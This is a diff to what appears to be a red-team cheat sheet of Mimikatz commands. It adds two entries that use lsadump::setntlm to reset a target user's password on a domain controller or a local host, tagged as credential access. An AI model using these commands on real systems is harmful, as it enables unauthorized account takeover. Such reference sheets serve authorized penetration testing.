@@ -156,3 +156,17 @@ ts::sessions
 ```
 ts::remote /id:<id>
 ```
+
+
+## change user password (Reset Domain)
+#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
+```
+lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<dc_name>
+```
+
+
+## change user password (Reset Local)
+#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
+```
+lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<target_name>
+```
